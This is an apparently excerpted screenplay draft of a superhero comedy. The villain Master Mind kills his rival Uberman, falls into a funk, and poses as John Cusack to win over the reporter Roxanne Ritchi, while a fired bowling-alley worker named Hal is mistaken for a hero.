""UBERMAN - METRO CITY\'S HERO AFTER DEFEATING MASTER MIND!              PHOTO: A chiseled, statuesque man wearing the COOLEST SUPER       HERO SUIT IMAGINABLE, COMPLETE WITH FLOWING CAPE, shines a       confident smile at the lens. This is UBERMAN, champion of       METRO CITY.              ""UBERMAN DEFEATS MASTER MIND\'S GIANT ROBOT!""              PHOTO: Wide-shot of Uberman in mid-flight lifting the GIANT       ROBOT in the sky above the city buildings.              ""MASTER MIND ALL WET AFTER UBERMAN FOILS AQUARIUM HEIST!""              PHOTO: Uberman stands knee-deep in water. He has his enemy by       the collar. The villain blocks his face from the shot with a       METALLIC GAUNTLET.              The images start to flash by even quicker, each showing the       MYSTERIOUS VILLAIN in various stages of humiliation. In each       photograph he successfully blocks his face with his armored       glove.              We ZOOM IN to the last headline.              ""MASTER MIND BEHIND BARS ONCE AGAIN - THANKS TO UBERMAN!""              PHOTO: Uberman stands in a gallant pose with his fists on his       hips, obviously trying to accentuate the ""U"" insignia on his       chest.              END OF CREDITS SEQUENCE              EXT. BUILDING - DAY              We DISSOLVE from the photograph to Uberman standing in the       exact same position.              WE PULL BACK showing him atop a BUILDING overlooking the city       below. A perfect view for our guardian hero.              He watches the thriving metropolis, bristling with life as       people happily go about their day.              Yet, we can\'t help but detect a hint of sadness in Uberman\'s       expression.                                                                2.                                                UBERMAN                 You look so peaceful from up here.              His serenity is suddenly interrupted by a loud BEEPING SOUND       coming from his wrist.              He looks down at a BRACELET (a manly one) on his right arm.       It\'s a silver band with a FLASHING red letter ""U"".                                  UBERMAN (CONT\'D)                 Looks like Roxanne\'s in trouble                 again.              Uberman leaps off the building and into the air. His cape       gracefully flows in the breeze behind him as he shoots off       into the distance like a speeding bullet.              EXT. OBSERVATORY HIDEOUT - ESTABLISHING SHOT              Grime and moss decorate the outside of this long abandoned       building overlooking the COAST. Once a place of knowledge and       wonder - now home to a great evil.              INT. OBSERVATORY HIDEOUT - DAY              The inside is in complete contrast to the exterior. The huge       hall with a GIANT TELESCOPE teems with advanced ELECTRONIC       EQUIPMENT. Computers, monitors and machines which do not have       an obvious function FLASH and HUM.              A STEEL DOOR slides open, revealing the subject of our story       MASTER MIND - a villainous sight to behold. His FACE IS       INEXPLICABLY LIGHT BLUE, topped by an OVERSIZED, MUSHROOM-       SHAPED HEAD with a CIRCULAR PATCH OF WHITE HAIR ON TOP.              He\'s dressed in the kind of costume only a super villain       could pull off: a PURPLE JUMPSUIT AND BLACK BOOT ENSEMBLE       WITH A GIANT GREEN ""M"" ON THE CHEST. His right hand, hanging       at his side, is a METAL GAUNTLET WITH THREE SHORT SPIKES       PROTRUDING BETWEEN HIS KNUCKLES.              Master Mind begins to survey the room with his TWO       PERMANENTLY ARCHED EYEBROWS.              A man dressed as ALBERT EINSTEIN is busy ranting to two other       men. One, a hulking brute, is dressed as LEONARDO DA VINCI.       The other, a small intellectual-type carrying a clip-board,       is dressed as the philosopher PLATO.                                  EINSTEIN                 I hate the outfits. I mean, I get                 it: we\'re all supposed to be                 ""masterminds"" - very clever.                           (MORE)                                                                 3.                           EINSTEIN(cont\'d)                 I just feel stupid. I mean, what                 the hell did Einstein really do                 anyway?                                  PLATO                 Theory of relativity.              Einstein starts feverishly scratching his side.                                  EINSTEIN                 Well, you\'d think he\'d invent a                 wool sweater that didn\'t itch so                 much.              Da Vinci and Plato\'s eyes suddenly grow with concern as they       see Master Mind walk up behind Einstein.              Einstein notices his colleague\'s staring over his right       shoulder and turns around.              He turns around and Master Mind SEIZES HIM BY HIS THROAT with       his metal gauntlet.                                  MASTER MIND                 The real Einstein once said, ""God                 does not play dice with the world.""                 He was right, because the world is                 MY dice. Is that understood?                                  DA VINCI & PLATO                 Sir! Yes, sir!                                  EINSTEIN                     (gasping for air)                 Yes, sir.              Master Mind undoes his grip on Einstein\'s throat.                                  MASTER MIND                 Alright, then - clean slate. Do we                 have the girl?                                  DA VINCI                 Yes, sir. She fell into our trap                 just like you knew she would.                                  MASTER MIND                 Reporters are a curious lot, and                 easily manipulated.              He quickly checks his physique in a GIANT MIRROR, adjusts his       posture and sucks in his gut.                                                                   4.                                                MASTER MIND                 Alright, let\'s not keep the lady                 waiting.              MOMENTS LATER              Da Vinci escorts a BLINDFOLDED and bound woman, ROXANNE       RITCHI, to the back of the room where Plato and Einstein are       standing guard over a large BLACK SWIVEL-CHAIR facing away       from us.              She pulls free of Da Vinci\'s grasp and waits for him to undo       the blindfold.              Her face uncovered, we finally see Roxanne\'s striking       features - all of which seem overshadowed by piercing eyes       that seem more put off by the situation than afraid of it.                                  MASTER MIND (O.S.)                 Miss Ritchi, we meet again.              The chair turns menacingly slow, finally revealing Master       Mind.                                  ROXANNE                 You didn\'t need to turn around like                 that. I can recognize the stench of                 failure.              Master Mind unleashes a wicked laugh.                                  MASTER MIND                 I trust you gentlemen know the very                 sassy Roxanne Ritchi, highly                 regarded investigative journalist                 who some say has a more than                 friendly relationship with our                 super powered foe Uberman. And Miss                 Ritchi, I trust you\'ve already met                 my new crew: The Mad Geniuses!              Roxanne gives Einstein a once over.                                  ROXANNE                 Looks like a real group of winners.                 At the risk of sounding cliche\',                 you\'ll never get away with this.                                  MASTER MIND                 In a way, I already have.              Roxanne unleashes an exhausted SIGH.                                                                5.                                                ROXANNE                 We go through this every time. You                 kidnap me to get to Uberman, he                 immediately finds your hideout,                 escapes whatever lame trap you\'ve                 come up with, and takes you and                 your cronies to jail. I propose we                 just save everybody some heartache                 this time by YOU letting me go, and                 ME forgetting this whole thing ever                 happened?                                  MASTER MIND                 What about my revenge?                                  ROXANNE                 We can say it was wasting                 everyone\'s time.                                  MASTER MIND                 You have a wicked tongue. I hope                 you rid yourself of that when                 you\'re my queen.              Roxanne unleashes a snort-filled laugh.                                  ROXANNE                 I\'m sorry. What makes you think I                 would want to be your queen?                                  MASTER MIND                 Power corrupts absolutely, Miss                 Ritchi. And when I have ultimate                 power over this city, I have                 absolutely every intention of                 corrupting you with it.                                  PLATO                 Sir!              Master Mind turns to Plato who\'s now standing at a computer       terminal.                                  MASTER MIND                     (annoyed)                 What is it!?              EXT. OBSERVATORY HIDEOUT - DAY              Uberman flies toward the Observatory like a rocket.                                                                   6.                                   INT. OBSERVATORY HIDEOUT - DAY              Uberman crashes through the wall to the room we were just in.       He looks around, but there\'s suddenly NOT A SOUL IN SIGHT.                                                               CUT TO:              EXT.

HYDROFOIL CONTROL ROOM - DAY              Machines, cables and terminals criss-cross the craft\'s main       bridge. Through the enormous surrounding windows we can see       the observatory shrinking in the distance.              Master Mind watches Uberman on a small TV monitor as the hero       intently searches his hideout.                                  UBERMAN                     (on monitor)                 Master Mind!              INT. OBSERVATORY HIDEOUT - DAY              Uberman throws up his arms in frustration when suddenly -                                  MASTER MIND (O.S.)                 Over here, old friend.              He turns to see a FAMILIAR BLUE FACE OF EVIL ON A GIANT       SCREEN.                                   UBERMAN                 What\'s the matter, miss your old                 jail cell?              Uberman starts walking toward the monitor.                                  MASTER MIND (ON MONITOR)                 Actually, I wanted to share the                 experience with my oldest friend.              A MECHANIZED CAGE shoots out of the floor, suddenly trapping       Metro City\'s protector.              Totally unfazed, our hero stares on.                                                                   7.                                                 UBERMAN                 You can\'t possibly believe this                 will work.              Master Mind pulls out a SMALL BLACK BOX with a SINGLE RED       BUTTON on it.                                  MASTER MIND (ON MONITOR)                 Oh, can\'t I? I have attained                 control of the Earth\'s most                 abundant energy source. I doubt                 even you are strong enough to                 withstand the FULL CONCENTRATED                 POWER OF THE SUN!!!              He presses the button.              EXT. OUTER SPACE              A sinister-looking SATELLITE orbits Earth\'s atmosphere. Its       bay doors suddenly open, deploying two huge SOLAR PANELS.              The panels shift, angling themselves in the direction of the       sun. They immediately start GLOWING as they absorb the       burning star\'s power.              The front of the satellite begins to make a loud HUMMING       SOUND as it prepares to unleash its unholy power.              INT. HYDROFOIL CONTROL ROOM - DAY              From the giant window we can see the boat is a good mile from       the observatory.                                  PLATO                 We\'re now at minimum safe distance,                 master.              Master Mind turns from the CAMERA he was broadcasting on and       puts down the control box.                                  MASTER MIND                 Excellent. Stop here, I like this                 view.                                  PLATO                 Twenty seconds until impact.              Master Mind turns to Roxanne who is being held by Da Vinci       and Einstein. She almost appears a little bored.              Disappointed by her lack of horror, he walks over to the       monitor now showing Uberman trapped in the cage.                                                                8.                                                MASTER MIND                 Any last words?              Uberman looks up at the screen with a cocky smile.                                  UBERMAN (ON MONITOR)                 Yes: there\'s no caging the power of                 justice.                                  PLATO                 Ten seconds to impact.              On the screen we see Uberman take two of the cage\'s bars in       his hands. He yanks...NOTHING.                                   PLATO (CONT\'D)                 Nine...              Master Mind stares at the monitor, slightly confused.                                   PLATO (CONT\'D)                 Eight...              Uberman yanks on the bars again, this time using his foot as       leverage.                                  MASTER MIND                     (genuinely concerned)                 What\'s going on?                                  UBERMAN                     (straining)                 Hold...on...a second.              Master Mind looks back at Plato and Einstein. They\'re equally       befuddled at the hero\'s sudden weakness.                                   PLATO                 Seven...              Uberman loses his grip and FALLS BACKWARD ON HIS ASS.                                  UBERMAN                 SON OF A BITCH!!              Master Mind and the minions all cringe in unison.              Da Vinci turns to Roxanne not believing his ears.                                  DA VINCI                 What did he just say?                                                                9.

Uberman looks up at the camera with a very grave expression.                                  UBERMAN                 Like you don\'t know. These bars are                 made of copper, aren\'t they?                                     PLATO                 Four...                                     MASTER MIND                 Yeah, so?              Uberman tries to shield his grief with his hand.                                  UBERMAN                 You figured out my weakness, damn                 you. I CAN\'T BEND COPPER!                                     PLATO                 Three...                                  MASTER MIND                 Your weakness is copper?                                     PLATO                 Two...one.              Everyone turns to the window.              EXT. OUTER SPACE              The satellite fires a giant BEAM OF LIGHT toward the earth.              EXT. OBSERVATORY HIDEOUT - DAY              The beam hits the observatory. The building instantly       EXPLODES in a white nova blast of fire.              INT. HYDROFOIL CONTROL ROOM - DAY              The blast is so bright everyone turns away from the window.       Then, as suddenly as it began, the awesome light dies out.              One by one, the passengers unshield their eyes and look out       toward the observatory.                                                                 10.                            All we can see through the haze of destruction is fire and       smoke.                                  PLATO                 I don\'t think even he could have                 survived that.              Einstein suddenly turns giddy with excitement.                                  EINSTEIN                 Whoa! Is it me or did you just                 finally destroy Uberman?                                   MASTER MIND                     (carefully skeptical)                 Well...let\'s not get ahead of                 ourselves.              Da Vinci suddenly sees something outside.                                  DA VINCI                 Look, there\'s something in the sky,                 coming this way.                                   ROXANNE                 Uberman!              Master Mind turns toward the window.              An object is in the air, flying directly toward them. As it       closes in we can just make out the FAMILIAR OUTLINE OF A       CAPPED FIGURE.                                  MASTER MIND                 I KNEW IT! PREPARE YOURSELVES! HE\'S                 GONNA RAM US!!!              Everyone scatters and braces themselves for the impact.              Master Mind, seeing all the good places taken, doesn\'t know       what to do with himself. He just covers his giant head with       his hands.              The figure CRASHES THROUGH THE WINDOW and lands at his feet.              He looks down to see a CHARRED BLACK HUMAN SKELETON. Around       its neck is the unmistakable black cape of Uberman.                                   MASTER MIND (CONT\'D)                     (horrified)                 HOLY SHIT!                                                               11.                            Roxanne breaks out of Da Vinci\'s hold and runs over to the       body.                                   ROXANNE                 Uberman?              She stares down at the still smoking corpse, the tattered       black cape with the yellow ""U"" on it.              Roxanne turns to Master Mind, who\'s still visibly dumbfounded       at the grotesque sight before him.                                  ROXANNE (CONT\'D)                 You killed him!              Roxanne\'s eyes roll back. Da Vinci catches her from behind as       she FAINTS.              Einstein turns to Master Mind, looking at him as if he\'s just       walked on water.                                  EINSTEIN                 You did it!              Now that he\'s committed the impossible - our villain is at a       complete loss.                                  MASTER MIND                 ...so I did.                                  EINSTEIN                 I mean, I know you always wanted                 to. I mean, all the schemes all the                 plots - I never thought you\'d                 actually be capable of it.              Giddy as a school girl, Einstein turns to his fellow       henchmen.                                  EINSTEIN                 This is history. Every villain and                 lackey in the history of villains                 and lackeys dream of this moment,                 but when does it actually EVER                 happen?              A sudden realization comes over his face.                                  EINSTEIN                 Good lord...You do all realize what                 we get to do now, don\'t you?                                                                  12.                            His question is met with acquisitive looks from Master Mind       and the others.                                  EINSTEIN                 We get to go on a crime wave.

Two beat officers see them and take chase after them around       the corner and into an alley.              After a moment the police reemerge from the alley screaming       and running for their lives as a GIANT ROBOT CHASES after       them.              The robot stops, then suddenly it\'s head opens up like       convertible car top with Master Mind and Plato at the       driver\'s wheel.

A VICIOUS TORNADO              It\'s heading for downtown Metro as Master Mind and the       lackeys coolly look on.              Three large DUMP TRUCKS pull up, filled to the brim with       bricks of CASH.                                                               13.                            The DRIVERS jump out as the lackeys take the driver seats in       the three trucks.              Master Mind is about to climb into the passenger seat of one       when a drivers taps him on the shoulder and motions toward       the tornado.                                   MASTER MIND                     (absentmindedly)                 Oh, right.

The tornado shrinks and disappears just before it hits the       city.              As they drive through the city streets, Master stares out the       window with a hint of something in his eyes.

He takes a step, pulls back his arm, and releases the ball,       following it with his eyes.              It\'s a horrible shot - INSTANT GUTTER BALL.

It\'s lookin\'                 REAL good.              It doesn\'t get anymore clear. This man is a pig.                                  VINNIE (O.S.)                 Hal, I want to see you in my                 office!              Hal turns to see VINNIE, owner of the bowling alley, calling       him.                                  VINNIE                 Now!              INT. KINGPIN BOWLING - VINNIE\'S OFFICE - MOMENTS LATER              Hal sits down, facing Vinnie who\'s sitting at his desk.                                  VINNIE                 You\'re fired. Leave your shirt and                 locker key.              This bit of news hits Hal like a freight train.                                  HAL                 Fired? Are you going to tell me                 why?                                  VINNIE                 Showing up to work late. Showing up                 to work late drunk. Sexually                 harassing customers. Stealing from                 the register.                                  HAL                 Vinnie, I don\'t know where you\'re                 getting these accusations -              Vinnie takes out a video tape from his desk drawer and puts       in a VCR.                                                               15.                                                    HAL                    Oh, which one do you supposedly                    have here?                                     VINNIE                    This is all of them at once.              TELEVISION              A WOMAN walks up to a BOWLING EMPLOYEE and hands him a pair       of shoes.              As the employee turns to the wall of shoes, a very drunk and       disheveled Hal comes running in and pushes him aside.                                     HAL                    I\'ve got this one, Benny. So,                    Cinderella. Can I help you find                    your glass slipper?                                     WOMAN                    Yeah, I\'m looking for a seven.              He folds his arms on the counter and leans into her with a       cat-like grin on his face.                                     HAL                        (with a leer)                    Seven - Well, maybe I could                    interest you in something in an                    EIGHT. Namely, me.              Disgusted, she walks off screen.                                     HAL                    Lesbo.              Suddenly realizing the register\'s open, he quickly grabs a       stack of cash and shoves it in his pocket.              BACK TO OFFICE              Vinnie turns off the television and waits for Hal to respond.                                     HAL                    From the angle of the camera, I can                    see where you might have gotten the                    wrong idea. Listen, Vinnie, I don\'t                    think you\'ve thought this through.                    If you fire me, who\'s gonna be                    captain of the alley\'s bowling                    team?                                                                 16.                                                VINNIE                 Um, I don\'t know. Maybe somebody                 who can actually bowl. You guys                 have never won a game. I hired you                 because you said you were on the                 pro circuit.                                  HAL                 No, I said I WILL BE on the pro                 circuit.                                  VINNIE                 Please, a loser like you will never                 amount to anything.              This harsh remark seems to leave Hal genuinely stunned.                                  HAL                 Wow...If that\'s how you feel...I                 guess we should then talk about                 what kind of severance I\'m gonna                 get.              EXT. KINGPIN BOWLING - DAY              TWO BRUISERS open the door and throw Hal out onto the street.              He quickly picks himself up and turns back toward the       building.                                  HAL                 Hey...what about my ball?              A bowling ball sails past him, just missing his head.                                     HAL                 Thank-you!              EXT. CHANNEL 7 NEWS BUILDING - DAY              The massive building with a giant 7 on the roof stands in the       heart of Metro City.              INT. CHANNEL 7 NEWS BUILDING - OFFICE - DAY              The cubicles and offices are alive with the hustle and bustle       of a busy news day.              Phones are RINGING, REPORTERS are TALKING, and Editors are       SHOUTING.              The elevator doors open and out steps Roxanne Ritchi.                                                               17.                            Everything stops as the entire office suddenly falls SILENT.              Somewhat taken aback by the reaction, Roxanne scans the room       to see every eye on her.                                  ROXANNE                 It\'s...um...It\'s good to be back.                 Thanks for everyone\'s cards and                 concerns. I really appreciated it -                 now I\'m ready to climb back on the                 horse.              No one is budging - their looks of pity are really starting       to make her uncomfortable.              The back office door suddenly opens and out comes FRANK       BONIN, the gruff, middle-aged Producer of Channel 7 News.              Noticing the silence, he looks up and sees the sad       expressions on everybody\'s face.                                  FRANK                 Someone die or something?              He suddenly notices Roxanne - both feet are placed firmly in       his mouth.                                   FRANK                     (cursing himself)                 Oh, Jesus.                                     ROXANNE                 It\'s okay.              Frank quickly walks up to Roxanne and takes her gently by the       arm.                                  FRANK                 Come on into my office, sweetie.              INT. CHANNEL 7 NEWS BUILDING - FRANK\'S OFFICE - CONTINUOUS              He sits her down on his leather couch, then quickly turns       toward his door.                                  FRANK                 Can we get this woman some water                 for God\'s sake?                     (to Rebecca)                 I gave you two months off. What\'re                 you doing back? People are gonna                 think I\'m a slave driver.                                                               18.                                                ROXANNE                 Aren\'t you?                                  FRANK                 Yeah, but I don\'t want people to                 think it.                                  ROXANNE                 Frank, listen. I want to go back to                 work. I NEED to go back to work.                                  FRANK                 ...You\'re hysterical, aren\'t you?              Frank sits down on the couch and blankets Roxanne with A WARM       EMBRACE.                                  ROXANNE                 What\'re you doing?                                  FRANK                 Keeping you warm before you go into                 shock.                     (toward the open door)                 DO I HAVE SLICE OPEN A CAMEL HUMP                 TO GET A GLASS OF WATER AROUND                 HERE?              A SECRETARY quickly enters with a bottled water. She sets it       on the table in front of them and leaves.              Roxanne pulls herself out of Frank\'s grasp and stands up to       face him.                                  ROXANNE                 It was a traumatic experience. Yes,                 everyone knows Uberman and me                 were...close. But what I really                 need - what would really make me                 better is getting back to work.              There\'s a sudden awkward silence from Frank.                                  FRANK                 Well, that\'s going to be...                                  ROXANNE                 I thought you\'d be happy to have me                 back.                                             19.                                      FRANK       Oh, we are. Honey, nothing makes us       happier than to have our girl back,       but...                         ROXANNE       Yes?                        FRANK       Things have sorta...changed.                        ROXANNE       In three weeks?                        FRANK       Listen, I\'m not one who likes to       open up wounds - especially ones       that are just starting to scab, but       you were sorta our go to girl for       the exclusive on Uberman. And now       that he\'s gone...I moved Brad into       your anchor spot.                        ROXANNE           (disgusted)       Brad? Brad Helms? The man is an       idiot.                        FRANK       It\'s the suits. They think it\'s       time to switch things up.                        ROXANNE       Oh, because they can\'t use me to       get the big story.                        FRANK       C\'mon, Roxie. Using is in the       nature of what we do. They used       you, you used Uberman. Everybody\'s       happy.                        ROXANNE           (defensive)       I didn\'t use him.                        FRANK       Oh, I didn\'t mean that. I know you       two were in love or something. My       bad.                         ROXANNE       We were.                                                                  20.                                                FRANK                 And that\'s great.                                  ROXANNE                 Very in love.              There\'s a hind of self-doubt in Roxanne\'s expression, as if       she\'s failed to convince even herself of this.                                  ROXANNE                 Okay. So, where are they going to                 move me if Brad has my spot?                                  FRANK                 ...Human interest.                                  ROXANNE                 Bake sales and pet stories.                                  FRANK                 I told them I wouldn\'t be surprised                 if you just upped and quit. You                 busted your ass for that desk.              Roxanne can hardly get it out - she\'s busy swallowing her       pride                                  ROXANNE                 I\'ll take it.              Frank looks up at her, not believing what he\'s hearing.                                  FRANK                 What?              EXT. ABANDONED METRO CITY LIBRARY   - NIGHT              Amongst the jungle of high rises, one small building stands       out from the rest - A tiny, forgotten piece of 19th century       Gothic architecture.

ABANDONED METRO CITY LIBRARY   - NIGHT              A mixture of old and new. Dusty Victorian furniture and       dilapidated bookshelves sit side by side with pristinely       futuristic machinery.              The building has been converted into Master Mind\'s new SECRET       LAIR.                                                               21.

MASTER MIND                     (feigning pleasure)                 Great, great. Put it on the pile.              Einstein tosses it on a LARGE PILE of purloined valuables in       the corner of the room.                                  EINSTEIN                 Anything else today?                                  MASTER MIND                 No.              Master Mind turns his attention back to the screen. Plato       sees that Master Mind is in a funk and tries to snap him out       of it.                                  PLATO                     (cheerfully)                 Sir, the new reactor is installed.              Plato nods to the giant orb.                                  PLATO                 Do you want to throw the switch?

Without turning away from the TV, Master Mind addresses       Plato.                                  MASTER MIND (CONT\'D)                 What is it, Plato?                                  PLATO                     (nervously)                 Sir, I can\'t help but notice that                 you\'ve been...a little down lately.                                  MASTER MIND                 When I want your opinion I\'ll beat                 it out of you.                                  PLATO                 Yes, sir, I know, but please                 forgive my impertinence. It\'s just                 that you seem to have lost your                 lust for our profession. You\'ve                 stopped going on jobs and spend                 most of your time watching Uberman                 specials.              Master Mind relaxes slightly and turns to face the window in       a classically contemplative pose. After an overdramatic       beat...                                  MASTER MIND                 I have defeated my greatest enemy.                 I have free reign over Metro City.                 I have more wealth than a thousand                 Sultans. I\'ve achieved all I have                 worked for...so why am I so                 unhappy?              He walks over to a PAINTED PORTRAIT that looks almost exactly       like him, except slightly older, maybe meaner - MASTER MIND\'S       FATHER.                                  MASTER MIND                 I mean, my father, god rest his                 evil and tormented soul, raised me                 straight from the test tube to be a                 symbol of evil.                           (MORE)                                                               23.                           MASTER MIND(cont\'d)                 And, I have accomplished something                 he had only dreamed about - the                 destruction of Metro City\'s                 champion. I tell you, I\'ve always                 lived with this unquenchable                 thirst. I thought it was to make                 him proud or to get absolute power.                 But now that I\'ve pretty much                 accomplished both, I am at a loss.                                  PLATO                 ...I sort of have a theory about                 all that.                                  MASTER MIND                     (snippy)                 Oh, really?                                  PLATO                 Well, for one thing, maybe Uberman                 was more important to you than you                 thought.                                  MASTER MIND                 He was a worthy rival. Sometimes I                 wonder, did he consider me his evil                 equal or was I just an annoying,                 little gnat to him? ...What\'s the                 second part?                                  PLATO                 I think you sort of have a thing                 for Roxanne Ritchi.              Master Mind quickly takes his lackey by the throat.                                  MASTER MIND                 YOU WORM! HOW DARE YOU! WHERE WOULD                 YOU GET SUCH A NOTION?                                  PLATO                 Sir, your plans always involve Ms.                 Ritchi either being kidnapped or                 placed in danger. If that\'s not                 love, I don\'t know what is. It\'s                 the grown up equivalent of dipping                 her pigtails in the ink well. Don\'t                 you see? She\'s the one treasure                 that\'s always escaped you.              From Master Mind\'s expression, we see Plato\'s words beginning       to ring true.                                                                  24.                            INT. RESTURAUNT - DAY              Roxanne is having lunch with several girlfriends sitting       around her, gabbing.                                  FRIEND #1                 I can\'t believe you came back so                 soon.                                  FRIEND #2                 Are you sure it\'s not TOO SOON,                 honey?                                  ROXANNE                 I just wanted to get back to work.                                  FRIEND #3                 What we need to do is get you back                 on the saddle...the love saddle.              Friend 1 and 2 give 3 disapproving looks.                                  FRIEND #3                 It\'s been three weeks.                                  FRIEND #2                 She just lost the love of her life,                 Grace.              A WAITER comes by with a tray of CAESAR SALADS and begins       setting them out for the ladies.                                  ROXANNE                 I keep trying to tell people it                 wasn\'t really like that. Uberman                 and I - We were kinda having                 problems. We broke up.              The waiter ALMOST DROPS HIS TRAY AT THIS. The women are too       shocked by Roxanne\'s revelation to notice.                                  FRIEND #1                 You broke up with Uberman!                                  FRIEND #3                 You must have REALLY, REALLY high                 standards. I mean, you were dating                 a god. I mean, what\'s it take?                                  ROXANNE                 Maybe someone who\'s a little more                 aware of his faults. Someone a                 little more sensitive.                                                                  25.                                                FRIEND #3                 Right. Someone who listens, sexy                 but attainable with cute little                 cheeks like a hamster and                 heartbreak in his eyes.              She turns to Friend one and two to explain.                                  FRIEND #3                 She wants John Cusack.                                     FRIEND #2                 The actor?                                  FRIEND #3                 No, the famous pediatrist - Yes,                 the actor. Ever since we were                 teenagers, Roxanne\'s totally had                 the hots for him.                                  ROXANNE                 Well, until he miraculously comes                 walking into my life, I\'m just                 going to take a little reflection                 time for myself.              The waiter gets a confused look on his face then slips away       as Roxanne and her friends continue to chat away.              EXT. RESTURAUNT - DAY              The waiter tosses his apron in a trash can, then rolls up his       sleeve and presses A STRANGE LOOKING DEVICE STRAPPED TO HIS       WRIST.              His image gets staticy, like a TV station going out, then       disappears - revealing the man\'s true form underneath: MASTER       MIND!                                  MASTER MIND                 Who the hell is John Cusack?              EXT. CITY STREET - DAY              A YOUNG MOTHER pushes her baby stroller past a building       construction site.              ACROSS THE STREET              A local POLITICIAN addresses a group of REPORTERS on the       sidewalk, including Roxanne.                                                                  26.                                                POLITICIAN                 The Fifth Avenue Renovation                 Project, which I championed, will                 breath new life into the downtown                 area. New life means new jobs and                 new revenue.                                  ROXANNE                 Councilman, is it true that your                 brother-in-law\'s construction                 company won the contract for this                 project?                                  POLITICIAN                 Well...er...yes, but...look I\'m not                 here to answer a lot of crazy                 questions...              YOUNG MOTHER              The young mother stops halfway down the block, reaches into       the stroller and tries to comfort her now crying baby.              Above her, a CRANE is maneuvering a pile of STEEL GIRDERS to       an upper floor.              Hal comes around the corner and heads in her direction.              CRANE              The crane GRINDS TO A HALT. The OPERATOR has a confused look       on his face as he moves levers back and forth in an effort to       fix the problem.              Hal stops a few feet from the woman and stoops down to tie       his shoe.              CRANE              The operator\'s hand slips off the lever, hitting a RED       BUTTON. To his horror the crane DROPS ITS LOAD OF STEEL.              HAL AND THE WOMAN              The woman looks up to see the girders seconds from crushing       her and her baby. She screams.              Hal looks up and sees it as well. He starts to run out of the       way and crashes into the woman and stroller.              ACROSS THE STREET                                                                  27.                            The reporters turns their cameras just in time to catch on       film what appears to be Hal pushing the woman to safety just       as the GIRDERS CRASH TO THE GROUND.              HAL AND MOTHER              Tears of joy in her eyes, the woman picks up her baby and       kisses it.              Hal struggles to catch his breath as the mother turns to him.                                  YOUNG MOTHER                 Thank you! Thank you for saving me                 and my baby!              She hugs him with her free arm, weeping with joy.                                     HAL                        (not knowing what she\'s                         talking about)                 Huh?              He\'s a little uncomfortable with the woman\'s public display       of affection and the small child in-between their embrace.                                  HAL (CONT\'D)                 There, there.              Hal slowly eases out of the woman\'s grip.                                  HAL (CONT\'D)                 Okay, we better...well, I hear                 these little guys smother easy.              The reporters rush over and surround Hal and the mother.                                  ROXANNE                 What\'s it feel like to be a hero?              Hal looks up at Roxanne. Instantly, he\'s captivated by her       beauty.                                  HAL                 Well...I\'m just a man doing what                 men do. You\'re Roxanne Ritchi,                 aren\'t you?              They\'re suddenly interrupted when another reporter pushes his       way in between them.                                  REPORTER                 Were you scared?                                                               28.                                                   HAL                    Scared? Who had time?              The reporters eat this up.              INT. ABANDONED METRO CITY LIBRARY    - NIGHT              TELEVISION              John Cusack stands in the rain looking up at a window of a       two story house. He holds up a BOOMBOX and ""In Your Eyes"" by       Peter Gabriel begins to play.              From the couch, Master Mind and his minions watch.                                     MASTER MIND                    John Cusack, huh? So all I have to                    do is have a cute puppy dog stare,                    be willing to make a fool of myself                    and - Oh, REMOVE BOTH MY BALLS.              He turns to see Da Vinci watching the movie and wiping a tear       from his cheek.                                     MASTER MIND                    Please, get a hold of yourself.              INT. BOOKSTORE - NIGHT              Roxanne is carrying a large paper coffee cup in her hands as       she peruses the isles. She sets it down on a shelf to pull a       book out and ends up KNOCKING THE DRINK OVER.                                     ROXANNE                    Shit.              She goes to pick it up when someone bends down and picks it       up for her.              Looking up to thank him, Roxanne is suddenly stunned       speechless - It\'s popular and critically acclaimed actor JOHN       CUSACK, or rather Master Mind disguised as him.                                     ""JOHN CUSACK""                    Oh the humanity - it was a Venti.                                     ROXANNE                        (stunned)                    You\'re...you\'re.                                     ""JOHN CUSACK""                    Yes, it\'s me. John Cusack...the                    actor.                                                                29.

Wait, I think                 remember something from that one -                 Let\'s see: ""My head is screaming `I                 want you and need you\' - my heart                 it keeps reaching to see you and                 feel you - yet in the end, I\'m                 alone once again."" Wow, I scare                 even myself. I\'m sorry. I\'m just                 really into poetry. Probably                 because I\'m so sensitive and always                 going to great lengths to express                 myself. But enough about me.

ROXANNE                 I did have a boyfriend - until                 fairly recently.              She suddenly begins to feel the stares around her as passers-       by being to notice who she\'s with.                                  ROXANNE                 I\'m sorry - this is so surreal!                                  ""JOHN CUSACK""                 Yeah, they charge way too much at                 these places - Now back to your                 boyfriend. I\'m interested and                 compassionate. I want to know about                 you.                                                               30.                                                ROXANNE                 Things were complicated. He was a                 man married to his work. There                 was...there was a lot of                 competition in his line of                 business. I\'m sure you know what                 that\'s like.                                  ""JOHN CUSACK""                 Sure. In my business, one thing I                 have is RIVALS. For example, mine                 is...uh...Lou Ferr...igno.                                  ROXANNE                 ...The body-builder who used to                 play The Hulk on TV?                                  ""JOHN CUSACK""                 Did he? Well, we\'re always up for                 the same roles. Did your boyfriend                 have someone like that? A                 particular rival that was always                 getting his goat - so to speak?                                  ROXANNE                 Well...one rival in particular                 seemed to get more of his attention                 than I ever did. But enough about                 my problems.                                  ""JOHN CUSACK""                 NO, TELL ME MORE!!!              Suddenly realizing his outburst, he begins COUGHING to mask       it.                                  ""JOHN CUSACK"" (CONT\'D)                 I\'m sorry. I got a whooping cough.                 Had it ever since Serendipity. I                 WONDER WHERE OUR REFILLS ARE!!!                 (fakes cough) See, there it goes                 again. Please, go on.                                  ROXANNE                 Right, well, he seemed to need him                 more than he needed me.                                  ""JOHN CUSACK""                 How do you mean?                                                                31.                                                ROXANNE                 It was conflict he thrived on. He                 always said he wouldn\'t know what                 to do with himself if Master - I                 mean, this guy were gone. It was                 like he needed it, like oxygen.              The answer to his mental funk hits him like a bolt of       lightening. He turns away from her as if for private time.                                  ""JOHN CUSACK""                     (almost to himself)                 I think I finally understand...The                 only logical answer is to recreate                 that rivalry - or if that\'s                 impossible, create one of equal                 structure. That\'s it!                                  ROXANNE                 What?              John Cusack snaps out of his dream-like haze realizing she\'s       heard every word.                                  ""JOHN CUSACK""                 Oh, sorry, sorry. Just rehearsing                 for a part...where I play a man who                 talks to himself at inappropriate                 times.              In a sudden rush, he rises out of his chair.                                  ""JOHN CUSACK""                 I have to go right now, but I\'d                 really like to see you again - if                 that\'s alright.              Roxanne looks up at him - She can\'t help but laugh at the       craziness of the situation.                                  ROXANNE                 I\'d love that.              INT.

